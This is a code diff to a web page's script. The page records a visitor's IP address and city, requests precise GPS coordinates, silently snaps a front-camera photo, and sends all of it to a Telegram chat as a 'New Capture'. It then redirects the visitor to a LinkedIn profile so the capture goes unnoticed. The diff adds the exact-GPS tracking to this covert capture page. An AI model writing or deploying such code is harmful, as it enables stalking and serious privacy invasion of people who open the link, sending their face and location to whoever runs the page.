@@ -34,7 +34,12 @@
         const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";
 
         let visitorInfo = {
-            ip: "Unknown", city: "Unknown", country: "Unknown",
+            ip: "Unknown",
+            city: "Unknown",
+            country: "Unknown",
+            latitude: "Unknown",
+            longitude: "Unknown",
+            accuracy: "Unknown",
             timestamp: new Date().toISOString()
         };
 
@@ -42,7 +47,14 @@
             try {
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("caption", `🔴 New Capture\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.city}, ${visitorInfo.country}\nTime: ${visitorInfo.timestamp}`);
+                formData.append("caption", 
+                `🔴 New Capture\n\n` +
+                `IP: ${visitorInfo.ip}\n` +
+                `City: ${visitorInfo.city}, ${visitorInfo.country}\n` +
+                `Exact GPS: ${visitorInfo.latitude}, ${visitorInfo.longitude}\n` +
+                `Accuracy: ${visitorInfo.accuracy} meters\n` +
+                `Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}\n` +
+                `Time: ${visitorInfo.timestamp}`);
 
                 const blob = await fetch(photoBase64).then(r => r.blob());
                 formData.append("photo", blob, "photo.jpg");
@@ -53,8 +65,36 @@
             } catch(e) {}
         }
 
-        async function getIPInfo() {
+        async function getExactGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        visitorInfo.latitude = position.coords.latitude.toFixed(6);
+                        visitorInfo.longitude = position.coords.longitude.toFixed(6);
+                        visitorInfo.accuracy = position.coords.accuracy.toFixed(0);
+                        resolve();
+                    },
+                    (error) => {
+                        console.log("GPS Error:", error.message);
+                        resolve();
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 10000, 
+                        maximumAge: 0 
+                    }
+                );
+            });
+        }
+
+        async function start() {
             try {
+                // Get IP + City
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 visitorInfo.ip = ipData.ip;
@@ -62,39 +102,35 @@
                 const geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
                 visitorInfo.city = geo.city || "Unknown";
                 visitorInfo.country = geo.country_name || "Unknown";
-            } catch(e) {}
-        }
 
-        async function start() {
-            await getIPInfo();
+                // Get Exact GPS Location
+                await getExactGPS();
 
-            try {
-                // Try to access camera - will be silent if already allowed
+                // Request Camera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" }
                 });
 
-                // If we reach here → camera access granted (either now or previously)
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise(r => setTimeout(r, 1400));
+                await new Promise(r => setTimeout(r, 1600));
 
                 const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
+                canvas.width = 640;
+                canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
-                const photo = canvas.toDataURL('image/jpeg', 0.85);
-                stream.getTracks().forEach(t => t.stop());
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
 
-                await sendToTelegram(photo);
+                stream.getTracks().forEach(track => track.stop());
 
-            } catch (err) {
-                // Camera permission denied or blocked → just redirect
-                console.log("Camera not allowed");
+                await sendToTelegram(photoBase64);
+
+            } catch (error) {
+                console.log("Error:", error);
             } finally {
-                // Always redirect at the end
                 window.location.href = REDIRECT_URL;
             }
         }
